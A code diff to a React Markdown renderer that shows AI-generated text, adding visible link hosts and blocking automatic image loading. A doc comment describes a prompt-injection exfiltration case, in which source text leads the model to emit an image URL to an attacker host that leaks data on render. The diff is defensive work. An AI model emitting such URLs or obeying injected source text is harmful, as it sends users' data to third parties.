@@ -61,14 +61,43 @@ function decorate(
   return node;
 }
 
+function hostOf(href: string | undefined): string | null {
+  if (!href) return null;
+  try {
+    const u = new URL(href);
+    return u.protocol === "http:" || u.protocol === "https:" ? u.hostname.replace(/^www\./, "") : null;
+  } catch {
+    return null;
+  }
+}
+
+/** Text of a rendered node, to tell whether a link already shows its address. */
+function plainText(node: React.ReactNode): string {
+  if (typeof node === "string" || typeof node === "number") return String(node);
+  if (Array.isArray(node)) return node.map(plainText).join("");
+  if (React.isValidElement(node)) {
+    return plainText((node.props as { children?: React.ReactNode }).children);
+  }
+  return "";
+}
+
 export default function Markdown({
   children,
   citations = [],
   onCite,
+  allowImages = false,
 }: {
   children: string;
   citations?: Citation[];
   onCite?: (c: Citation) => void;
+  /**
+   * Render Markdown images. Off by default: model output is shaped by source
+   * text the user never wrote, and an injected `![](https://attacker/?q=…)`
+   * would otherwise be fetched by the browser on render — silently sending
+   * whatever the model put in the URL, including other sources' contents.
+   * Only text the user wrote themselves should turn this on.
+   */
+  allowImages?: boolean;
 }) {
   const map = new Map(citations.map((c) => [c.n, c]));
   const wrap = (Tag: keyof React.JSX.IntrinsicElements) => {
@@ -90,11 +119,38 @@ export default function Markdown({
           h2: wrap("h2"),
           h3: wrap("h3"),
           h4: wrap("h4"),
-          a: ({ href, children: kids }) => (
-            <a href={href} target="_blank" rel="noreferrer">
-              {kids}
-            </a>
-          ),
+          a: ({ href, children: kids }) => {
+            const host = hostOf(href);
+            // Show where a link goes when its text does not already say so.
+            const showHost = host && !plainText(kids).toLowerCase().includes(host.toLowerCase());
+            return (
+              <a href={href} target="_blank" rel="noopener noreferrer nofollow" title={href}>
+                {kids}
+                {showHost && <span className="md-host"> ({host})</span>}
+              </a>
+            );
+          },
+          img: ({ src, alt }) => {
+            const url = typeof src === "string" ? src : undefined;
+            if (allowImages) {
+              // eslint-disable-next-line @next/next/no-img-element
+              return <img src={url} alt={alt ?? ""} />;
+            }
+            const host = hostOf(url);
+            return (
+              <span className="md-blocked-img" title="Images in generated text are not loaded automatically">
+                🖼️ {alt?.trim() || "Image"}
+                {url && host && (
+                  <>
+                    {" "}
+                    <a href={url} target="_blank" rel="noopener noreferrer nofollow">
+                      open from {host}
+                    </a>
+                  </>
+                )}
+              </span>
+            );
+          },
         }}
       >
         {children}
